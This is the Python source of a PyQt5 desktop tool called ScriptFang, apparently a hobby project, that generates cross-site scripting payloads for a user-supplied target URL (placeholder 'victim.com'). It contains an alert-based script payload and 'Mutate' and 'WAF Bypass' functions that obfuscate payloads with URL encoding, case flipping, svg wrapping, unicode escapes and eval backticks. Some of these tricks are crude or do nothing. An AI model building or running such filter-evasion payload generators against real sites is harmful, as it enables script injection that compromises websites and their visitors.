import sys
import os
import random
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QVBoxLayout,
    QPushButton, QTextEdit, QLineEdit, QFileDialog,
    QHBoxLayout, QComboBox
)
from PyQt5.QtGui import QMovie, QFont
from PyQt5.QtCore import Qt

def load_payloads():
    try:
        with open("payloads/xss.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return ["<script>alert('XSS');</script>"]

def mutate_payload(payload):
    variants = [
        payload.replace("<", "%3C"),
        payload.replace("script", "scr<script>ipt"),
        payload.replace("alert", "alert"),
        ''.join(random.choice([c.upper(), c.lower()]) for c in payload),
        payload.replace("=", "%3D")
    ]
    return random.choice(variants)

def generate_waf_bypass(payload):
    tricks = [
        payload.replace("<", "<svg><script>"),
        payload.replace("script", "scr\\u0069pt"),
        payload.replace("=", "&#x3D;"),
        payload.replace("alert", "eval`alert(1)`")
    ]
    return random.choice(tricks)

class ScriptFangGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ScriptFang")
        self.setFixedSize(1024, 600)

        self.background_label = QLabel(self)
        self.movie = QMovie("assets/dragons.gif")
        self.background_label.setMovie(self.movie)
        self.movie.start()
        self.background_label.setScaledContents(True)
        self.background_label.setGeometry(0, 0, 1024, 600)

        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 20, 20, 20)

        self.title = QLabel("ScriptFang")
        self.title.setFont(QFont("Courier", 36))
        self.title.setStyleSheet("color: #00ff00")
        self.title.setAlignment(Qt.AlignCenter)

        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Enter target URL (e.g., https://victim.com/search?q=)")
        self.target_input.setStyleSheet("background-color: rgba(0,0,0,0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;")
        self.target_input.setFixedHeight(35)

        self.mode_selector = QComboBox()
        self.mode_selector.addItems(["Normal", "Mutate", "WAF Bypass"])
        self.mode_selector.setStyleSheet("background-color: black; color: #00ff00")

        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setStyleSheet("background-color: rgba(0, 0, 0, 0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;")
        self.output_area.setFixedHeight(120)

        self.generate_button = QPushButton("Generate Payload")
        self.generate_button.clicked.connect(self.generate_payload)
        self.generate_button.setStyleSheet("background-color: rgba(0,100,0,0.7); color: white; font-size: 15px; border-radius: 8px;")
        self.generate_button.setFixedHeight(40)

        button_layout = QHBoxLayout()
        button_layout.addWidget(self.generate_button)
        button_layout.addWidget(self.mode_selector)

        self.credit = QLabel("Made by Talyx | GitHub: Talyx66")
        self.credit.setStyleSheet("color: #00ff00")
        self.credit.setAlignment(Qt.AlignCenter)

        layout.addWidget(self.title)
        layout.addWidget(self.target_input)
        layout.addLayout(button_layout)
        layout.addWidget(self.output_area)
        layout.addWidget(self.credit)

        self.setLayout(layout)

    def generate_payload(self):
        payloads = load_payloads()
        chosen = random.choice(payloads)
        mode = self.mode_selector.currentText()

        if mode == "Mutate":
            chosen = mutate_payload(chosen)
        elif mode == "WAF Bypass":
            chosen = generate_waf_bypass(chosen)

        self.output_area.setText(chosen)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = ScriptFangGUI()
    gui.show()
    sys.exit(app.exec_())
